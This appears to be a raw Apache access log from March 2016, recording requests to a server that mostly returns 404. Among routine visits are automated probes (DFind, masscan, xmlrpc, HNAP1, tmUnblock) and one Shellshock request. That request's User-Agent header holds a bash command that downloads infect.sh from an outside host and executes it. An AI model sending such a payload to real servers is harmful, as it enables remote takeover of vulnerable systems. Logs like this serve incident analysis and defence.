86.111.247.39 - - [15/Mar/2016:14:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.200.66 - - [15/Mar/2016:23:09:08 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:23:29:37 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:00:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:02:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:04:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:06:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:07:51:52 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:19:00 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:27:36 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:27:43 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:31:20 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:08:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
192.99.58.36 - - [16/Mar/2016:10:24:36 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 0 "-" "-"
198.245.55.60 - - [16/Mar/2016:10:26:31 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 0 "-" "-"
86.111.247.39 - - [16/Mar/2016:10:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:11:49:02 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:11:49:07 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:12:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
81.245.67.206 - - [16/Mar/2016:12:56:33 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:33 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:35 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:35 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
86.111.247.39 - - [16/Mar/2016:14:39:04 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:16:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:17:36:54 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:18:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.194.66 - - [16/Mar/2016:19:51:27 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
54.81.168.187 - - [16/Mar/2016:20:24:57 +0000] "HEAD / HTTP/1.1" 404 140 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
86.111.247.39 - - [16/Mar/2016:20:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:22:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
181.214.92.100 - - [16/Mar/2016:23:30:14 +0000] "POST /xmlrpc.php HTTP/1.0" 404 388 "-" "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0"
123.59.59.52 - - [17/Mar/2016:00:25:31 +0000] "GET http://www.mafengwo.cn/ HTTP/1.1" 404 378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
123.59.59.52 - - [17/Mar/2016:00:25:59 +0000] "GET http://www.mafengwo.cn/ HTTP/1.1" 404 378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
86.111.247.39 - - [17/Mar/2016:00:39:04 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
94.102.51.124 - - [17/Mar/2016:01:35:16 +0000] "GET / HTTP/1.1" 404 378 "-" "() { :; }; /bin/bash -c 'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh'"
86.111.247.39 - - [17/Mar/2016:02:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
54.159.78.53 - - [17/Mar/2016:02:56:46 +0000] "HEAD / HTTP/1.1" 404 140 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
192.99.144.140 - - [17/Mar/2016:03:57:50 +0000] "PROPFIND /webdav/ HTTP/1.1" 405 495 "-" "WEBDAV Client"
86.111.247.39 - - [17/Mar/2016:04:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
67.197.242.57 - - [17/Mar/2016:04:39:46 +0000] "GET /tmUnblock.cgi HTTP/1.1" 400 0 "-" "-"
67.197.242.57 - - [17/Mar/2016:04:39:47 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
86.111.247.39 - - [17/Mar/2016:06:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [17/Mar/2016:08:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
159.203.250.214 - - [17/Mar/2016:09:33:56 +0000] "GET / HTTP/1.0" 404 378 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
83.166.234.6 - - [17/Mar/2016:09:55:18 +0000] "GET / HTTP/1.1" 404 359 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
83.166.234.6 - - [17/Mar/2016:09:55:18 +0000] "GET /HNAP1/ HTTP/1.1" 404 365 "http://51.255.42.209/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
86.111.247.39 - - [17/Mar/2016:10:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
101.227.255.195 - - [17/Mar/2016:10:46:23 +0000] "GET /script HTTP/1.1" 404 421 "-" "python-requests/2.7.0 CPython/2.7.0 Windows/2008ServerR2"
193.190.65.65 - - [17/Mar/2016:11:11:46 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:11:16:45 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 442 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 434 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 434 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:45 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 446 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:45 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
86.111.247.39 - - [17/Mar/2016:12:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
193.190.65.65 - - [17/Mar/2016:12:57:55 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:58:47 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:58:47 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:59:03 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:14:38:14 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [17/Mar/2016:14:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
89.248.172.201 - - [17/Mar/2016:15:01:34 +0000] "GET / HTTP/1.1" 404 359 "-" "-"
193.190.65.65 - - [17/Mar/2016:16:09:30 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
66.249.93.97 - - [17/Mar/2016:16:09:42 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
66.249.93.89 - - [17/Mar/2016:16:09:42 +0000] "GET /favicon.ico HTTP/1.1" 404 426 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
193.190.65.65 - - [17/Mar/2016:16:10:27 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:16:10:40 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
86.111.247.39 - - [17/Mar/2016:16:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [17/Mar/2016:18:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
89.68.13.46 - - [17/Mar/2016:20:13:32 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
89.68.13.46 - - [17/Mar/2016:20:13:32 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "http://vps224842.ovh.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
